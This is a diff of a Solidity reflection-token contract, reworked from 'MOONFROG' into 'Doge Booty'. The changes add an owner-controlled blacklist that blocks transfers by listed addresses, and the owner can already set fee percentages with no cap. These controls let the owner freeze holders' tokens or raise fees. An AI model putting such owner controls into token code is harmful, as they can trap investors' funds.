@@ -1,18 +1,12 @@
 /**
- *Prepare and develped by nomanhaq@hotmail.com
+ *Submitted for verification at BscScan.com on 2021-07-28
 */
 
-// SPDX-License-Identifier: Unlicensed
-
 /**
+ *Submitted for verification at BscScan.com on 2021-07-28
+*/
 
-   #MOONFROG
-
-   3% fee auto add to the liquidity pool to locked forever when selling
-   3% fee auto distribute to all holders
-   3% fee auto moved to charity wallet
-
- */
+// SPDX-License-Identifier: MIT
 
 pragma solidity ^0.8.3;
 
@@ -524,6 +518,8 @@ library Address {
  * `onlyOwner`, which can be applied to your functions to restrict their use to
  * the owner.
  */
+ 
+
 abstract contract Ownable is Context {
     address private _owner;
 
@@ -533,7 +529,7 @@ abstract contract Ownable is Context {
      * @dev Initializes the contract setting the deployer as the initial owner.
      */
     constructor () {
-        _owner = 0xD109fc566401ca57445810b9A3C187876cf44544; // Nomanhaq Address for test 
+        _owner = _msgSender();
         emit OwnershipTransferred(address(0), _owner);
     }
 
@@ -777,7 +773,7 @@ interface IUniswapV2Router02 is IUniswapV2Router01 {
     ) external;
 }
 
-contract MoonFrog is Context, IERC20, Ownable {
+contract DogeBooty is Context, IERC20, Ownable {
     using SafeMath for uint256;
     using Address for address;
 
@@ -790,26 +786,23 @@ contract MoonFrog is Context, IERC20, Ownable {
     mapping (address => bool) private _isExcluded;
     address[] private _excluded;
 
-   // address private _charityWalletAddress = 0x0000000000000000000000000000000000000000; // Charity address
-    address private _charityWalletAddress = 0x0000000000000000000000000000000000000000; // Burn Address
-    
-    
+    address private _marketingWalletAddress = 0x37024940342307e195EAE82521B389182d510bE7;
    
     uint256 private constant MAX = ~uint256(0);
-    uint256 private _tTotal = 1000000000000 * 10**9;
+    uint256 private _tTotal = 696969696969  * 10**9;
     uint256 private _rTotal = (MAX - (MAX % _tTotal));
     uint256 private _tFeeTotal;
 
-    string private _name = "MOONFROG";
-    string private _symbol = "FROG";
+    string private _name = "Doge Booty";
+    string private _symbol = "DogeBooty";
     uint8 private _decimals = 9;
     
-    uint256 public _taxFee = 3;
+    uint256 private _taxFee = 0;
     uint256 private _previousTaxFee = _taxFee;
     
-    uint256 public _charityFee = 3;
-    uint256 private _previousCharityFee = _charityFee;
-    uint256 public _liquidityFee = 3;
+    uint256 private _marketingFee = 0;
+    uint256 private _previousmarketingFee = _marketingFee;
+    uint256 private _liquidityFee = 0;
     uint256 private _previousLiquidityFee = _liquidityFee;
 
     IUniswapV2Router02 public immutable uniswapV2Router;
@@ -818,8 +811,11 @@ contract MoonFrog is Context, IERC20, Ownable {
     bool inSwapAndLiquify;
     bool public swapAndLiquifyEnabled = true;
     
-    uint256 public _maxTxAmount = 5000000 * 10**6 * 10**9;
-    uint256 private numTokensSellToAddToLiquidity = 500000 * 10**6 * 10**9;
+    uint256 public _maxTxAmount = 13939393939 *  10**9;
+    uint256 private numTokensSellToAddToLiquidity = 13939393939  * 10**9;
+
+    mapping (address => bool) private _isBlackListedBot;
+    address[] private _blackListedBots;
     
     event MinTokensBeforeSwapUpdated(uint256 minTokensBeforeSwap);
     event SwapAndLiquifyEnabledUpdated(bool enabled);
@@ -837,9 +833,13 @@ contract MoonFrog is Context, IERC20, Ownable {
     
     constructor () {
         _rOwned[owner()] = _rTotal;
+
+         //IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0xD99D1c33F9fC3444f8101754aBC46c52416550D1);// BSC testnet        
         
-        //IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x05fF2B0DB69458A0750badebc4f9e13aDd608C7F);// BSC mainnet
-        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);// Ethereum mainnet for uniswap
+         IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x10ED43C718714eb63d5aA57B78B54704E256024E);// BSC mainnet
+
+        //IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);// Ethereum mainnet for uniswap        
+
          // Create a uniswap pair for this new token
         uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory())
             .createPair(address(this), _uniswapV2Router.WETH());
@@ -850,8 +850,45 @@ contract MoonFrog is Context, IERC20, Ownable {
         //exclude owner and this contract from fee
         _isExcludedFromFee[owner()] = true;
         _isExcludedFromFee[address(this)] = true;
+
+
+        // BLACKLIST
+        _isBlackListedBot[address(0xE031b36b53E53a292a20c5F08fd1658CDdf74fce)] = true;
+        _blackListedBots.push(address(0xE031b36b53E53a292a20c5F08fd1658CDdf74fce));
+
+        _isBlackListedBot[address(0xe516bDeE55b0b4e9bAcaF6285130De15589B1345)] = true;
+        _blackListedBots.push(address(0xe516bDeE55b0b4e9bAcaF6285130De15589B1345));
+
+        _isBlackListedBot[address(0xa1ceC245c456dD1bd9F2815a6955fEf44Eb4191b)] = true;
+        _blackListedBots.push(address(0xa1ceC245c456dD1bd9F2815a6955fEf44Eb4191b));
+
+        _isBlackListedBot[address(0xd7d3EE77D35D0a56F91542D4905b1a2b1CD7cF95)] = true;
+        _blackListedBots.push(address(0xd7d3EE77D35D0a56F91542D4905b1a2b1CD7cF95));
+
+        _isBlackListedBot[address(0xFe76f05dc59fEC04184fA0245AD0C3CF9a57b964)] = true;
+        _blackListedBots.push(address(0xFe76f05dc59fEC04184fA0245AD0C3CF9a57b964));
+
+        _isBlackListedBot[address(0xDC81a3450817A58D00f45C86d0368290088db848)] = true;
+        _blackListedBots.push(address(0xDC81a3450817A58D00f45C86d0368290088db848));
+
+        _isBlackListedBot[address(0x45fD07C63e5c316540F14b2002B085aEE78E3881)] = true;
+        _blackListedBots.push(address(0x45fD07C63e5c316540F14b2002B085aEE78E3881));
+
+        _isBlackListedBot[address(0x27F9Adb26D532a41D97e00206114e429ad58c679)] = true;
+        _blackListedBots.push(address(0x27F9Adb26D532a41D97e00206114e429ad58c679));
         
+        _isBlackListedBot[address(0x37024940342307e195EAE82521B389182d510bE7)] = true;
+        _blackListedBots.push(address(0x37024940342307e195EAE82521B389182d510bE7));        
+
+
+
+
+
         emit Transfer(address(0), owner(), _tTotal);
+    }
+
+    function isBot(address account) public view returns (bool) {
+        return  _isBlackListedBot[account];
     }
 
     function name() public view returns (string memory) {
@@ -890,6 +927,9 @@ contract MoonFrog is Context, IERC20, Ownable {
     }
 
     function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
+        require(!_isBlackListedBot[sender], "You have no power here!");
+        require(!_isBlackListedBot[recipient], "You have no power here!");
+        require(!_isBlackListedBot[tx.origin], "You have no power here!");
         _transfer(sender, recipient, amount);
         _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
         return true;
@@ -904,6 +944,28 @@ contract MoonFrog is Context, IERC20, Ownable {
         _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
         return true;
     }
+
+// Bot Functions 
+
+    function addBotToBlackList(address account) external onlyOwner() {
+        require(account != 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D, 'We can not blacklist Uniswap router.');
+        require(!_isBlackListedBot[account], "Account is already blacklisted");
+        _isBlackListedBot[account] = true;
+        _blackListedBots.push(account);
+    }
+
+    function removeBotFromBlackList(address account) external onlyOwner() {
+        require(_isBlackListedBot[account], "Account is not blacklisted");
+        for (uint256 i = 0; i < _blackListedBots.length; i++) {
+            if (_blackListedBots[i] == account) {
+                _blackListedBots[i] = _blackListedBots[_blackListedBots.length - 1];
+                _isBlackListedBot[account] = false;
+                _blackListedBots.pop();
+                break;
+            }
+        }
+    }
+
 
     function isExcludedFromReward(address account) public view returns (bool) {
         return _isExcluded[account];
@@ -962,13 +1024,13 @@ contract MoonFrog is Context, IERC20, Ownable {
         }
     }
         function _transferBothExcluded(address sender, address recipient, uint256 tAmount) private {
-        (uint256 rAmount, uint256 rTransferAmount, uint256 rFee, uint256 tTransferAmount, uint256 tFee, uint256 tLiquidity, uint256 tCharity) = _getValues(tAmount);
+        (uint256 rAmount, uint256 rTransferAmount, uint256 rFee, uint256 tTransferAmount, uint256 tFee, uint256 tLiquidity, uint256 tmarketing) = _getValues(tAmount);
         _tOwned[sender] = _tOwned[sender].sub(tAmount);
         _rOwned[sender] = _rOwned[sender].sub(rAmount);
         _tOwned[recipient] = _tOwned[recipient].add(tTransferAmount);
         _rOwned[recipient] = _rOwned[recipient].add(rTransferAmount);        
         _takeLiquidity(tLiquidity);
-        _takeCharity(tCharity);
+        _takemarketing(tmarketing);
         _reflectFee(rFee, tFee);
         emit Transfer(sender, recipient, tTransferAmount);
     }
@@ -985,8 +1047,8 @@ contract MoonFrog is Context, IERC20, Ownable {
         _taxFee = taxFee;
     }
 
-    function setCharityFeePercent(uint256 charityFee) external onlyOwner() {
-        _charityFee = charityFee;
+    function setmarketingFeePercent(uint256 marketingFee) external onlyOwner() {
+        _marketingFee = marketingFee;
     }
     
     function setLiquidityFeePercent(uint256 liquidityFee) external onlyOwner() {
@@ -1013,25 +1075,25 @@ contract MoonFrog is Context, IERC20, Ownable {
     }
 
     function _getValues(uint256 tAmount) private view returns (uint256, uint256, uint256, uint256, uint256, uint256, uint256) {
-        (uint256 tTransferAmount, uint256 tFee, uint256 tLiquidity, uint256 tCharity) = _getTValues(tAmount);
-        (uint256 rAmount, uint256 rTransferAmount, uint256 rFee) = _getRValues(tAmount, tFee, tLiquidity, tCharity, _getRate());
-        return (rAmount, rTransferAmount, rFee, tTransferAmount, tFee, tLiquidity, tCharity);
+        (uint256 tTransferAmount, uint256 tFee, uint256 tLiquidity, uint256 tmarketing) = _getTValues(tAmount);
+        (uint256 rAmount, uint256 rTransferAmount, uint256 rFee) = _getRValues(tAmount, tFee, tLiquidity, tmarketing, _getRate());
+        return (rAmount, rTransferAmount, rFee, tTransferAmount, tFee, tLiquidity, tmarketing);
     }
 
     function _getTValues(uint256 tAmount) private view returns (uint256, uint256, uint256, uint256) {
         uint256 tFee = calculateTaxFee(tAmount);
         uint256 tLiquidity = calculateLiquidityFee(tAmount);
-        uint256 tCharity = calculateCharityFee(tAmount);
-        uint256 tTransferAmount = tAmount.sub(tFee).sub(tLiquidity).sub(tCharity);
-        return (tTransferAmount, tFee, tLiquidity, tCharity);
+        uint256 tmarketing = calculatemarketingFee(tAmount);
+        uint256 tTransferAmount = tAmount.sub(tFee).sub(tLiquidity).sub(tmarketing);
+        return (tTransferAmount, tFee, tLiquidity, tmarketing);
     }
 
-    function _getRValues(uint256 tAmount, uint256 tFee, uint256 tLiquidity, uint256 tCharity, uint256 currentRate) private pure returns (uint256, uint256, uint256) {
+    function _getRValues(uint256 tAmount, uint256 tFee, uint256 tLiquidity, uint256 tmarketing, uint256 currentRate) private pure returns (uint256, uint256, uint256) {
         uint256 rAmount = tAmount.mul(currentRate);
         uint256 rFee = tFee.mul(currentRate);
         uint256 rLiquidity = tLiquidity.mul(currentRate);
-        uint256 rCharity = tCharity.mul(currentRate);
-        uint256 rTransferAmount = rAmount.sub(rFee).sub(rLiquidity).sub(rCharity);
+        uint256 rmarketing = tmarketing.mul(currentRate);
+        uint256 rTransferAmount = rAmount.sub(rFee).sub(rLiquidity).sub(rmarketing);
         return (rAmount, rTransferAmount, rFee);
     }
 
@@ -1060,12 +1122,12 @@ contract MoonFrog is Context, IERC20, Ownable {
             _tOwned[address(this)] = _tOwned[address(this)].add(tLiquidity);
     }
     
-    function _takeCharity(uint256 tCharity) private {
+    function _takemarketing(uint256 tmarketing) private {
         uint256 currentRate =  _getRate();
-        uint256 rCharity = tCharity.mul(currentRate);
-        _rOwned[_charityWalletAddress] = _rOwned[_charityWalletAddress].add(rCharity);
-        if(_isExcluded[_charityWalletAddress])
-            _tOwned[_charityWalletAddress] = _tOwned[_charityWalletAddress].add(tCharity);
+        uint256 rmarketing = tmarketing.mul(currentRate);
+        _rOwned[_marketingWalletAddress] = _rOwned[_marketingWalletAddress].add(rmarketing);
+        if(_isExcluded[_marketingWalletAddress])
+            _tOwned[_marketingWalletAddress] = _tOwned[_marketingWalletAddress].add(tmarketing);
     }
     
     function calculateTaxFee(uint256 _amount) private view returns (uint256) {
@@ -1074,8 +1136,8 @@ contract MoonFrog is Context, IERC20, Ownable {
         );
     }
 
-    function calculateCharityFee(uint256 _amount) private view returns (uint256) {
-        return _amount.mul(_charityFee).div(
+    function calculatemarketingFee(uint256 _amount) private view returns (uint256) {
+        return _amount.mul(_marketingFee).div(
             10**2
         );
     }
@@ -1090,17 +1152,17 @@ contract MoonFrog is Context, IERC20, Ownable {
         if(_taxFee == 0 && _liquidityFee == 0) return;
         
         _previousTaxFee = _taxFee;
-        _previousCharityFee = _charityFee;
+        _previousmarketingFee = _marketingFee;
         _previousLiquidityFee = _liquidityFee;
         
         _taxFee = 0;
-        _charityFee = 0;
+        _marketingFee = 0;
         _liquidityFee = 0;
     }
     
     function restoreAllFee() private {
         _taxFee = _previousTaxFee;
-        _charityFee = _previousCharityFee;
+        _marketingFee = _previousmarketingFee;
         _liquidityFee = _previousLiquidityFee;
     }
     
@@ -1124,6 +1186,9 @@ contract MoonFrog is Context, IERC20, Ownable {
         require(from != address(0), "ERC20: transfer from the zero address");
         require(to != address(0), "ERC20: transfer to the zero address");
         require(amount > 0, "Transfer amount must be greater than zero");
+        require(!_isBlackListedBot[from], "You have no power here!");
+        require(!_isBlackListedBot[to], "You have no power here!");
+        require(!_isBlackListedBot[tx.origin], "You have no power here!");        
         if(from != owner() && to != owner())
             require(amount <= _maxTxAmount, "Transfer amount exceeds the maxTxAmount.");
 
@@ -1240,36 +1305,35 @@ contract MoonFrog is Context, IERC20, Ownable {
     }
 
     function _transferStandard(address sender, address recipient, uint256 tAmount) private {
-        (uint256 rAmount, uint256 rTransferAmount, uint256 rFee, uint256 tTransferAmount, uint256 tFee, uint256 tLiquidity, uint256 tCharity) = _getValues(tAmount);
+        (uint256 rAmount, uint256 rTransferAmount, uint256 rFee, uint256 tTransferAmount, uint256 tFee, uint256 tLiquidity, uint256 tmarketing) = _getValues(tAmount);
         _rOwned[sender] = _rOwned[sender].sub(rAmount);
         _rOwned[recipient] = _rOwned[recipient].add(rTransferAmount);
         _takeLiquidity(tLiquidity);
-        _takeCharity(tCharity);
+        _takemarketing(tmarketing);
         _reflectFee(rFee, tFee);
         emit Transfer(sender, recipient, tTransferAmount);
     }
 
     function _transferToExcluded(address sender, address recipient, uint256 tAmount) private {
-        (uint256 rAmount, uint256 rTransferAmount, uint256 rFee, uint256 tTransferAmount, uint256 tFee, uint256 tLiquidity, uint256 tCharity) = _getValues(tAmount);
+        (uint256 rAmount, uint256 rTransferAmount, uint256 rFee, uint256 tTransferAmount, uint256 tFee, uint256 tLiquidity, uint256 tmarketing) = _getValues(tAmount);
         _rOwned[sender] = _rOwned[sender].sub(rAmount);
         _tOwned[recipient] = _tOwned[recipient].add(tTransferAmount);
         _rOwned[recipient] = _rOwned[recipient].add(rTransferAmount);           
         _takeLiquidity(tLiquidity);
-        _takeCharity(tCharity);
+        _takemarketing(tmarketing);
         _reflectFee(rFee, tFee);
         emit Transfer(sender, recipient, tTransferAmount);
     }
 
     function _transferFromExcluded(address sender, address recipient, uint256 tAmount) private {
-        (uint256 rAmount, uint256 rTransferAmount, uint256 rFee, uint256 tTransferAmount, uint256 tFee, uint256 tLiquidity, uint256 tCharity) = _getValues(tAmount);
+        (uint256 rAmount, uint256 rTransferAmount, uint256 rFee, uint256 tTransferAmount, uint256 tFee, uint256 tLiquidity, uint256 tmarketing) = _getValues(tAmount);
         _tOwned[sender] = _tOwned[sender].sub(tAmount);
         _rOwned[sender] = _rOwned[sender].sub(rAmount);
         _rOwned[recipient] = _rOwned[recipient].add(rTransferAmount);   
         _takeLiquidity(tLiquidity);
-        _takeCharity(tCharity);
+        _takemarketing(tmarketing);
         _reflectFee(rFee, tFee);
         emit Transfer(sender, recipient, tTransferAmount);
     }
 
 }
-
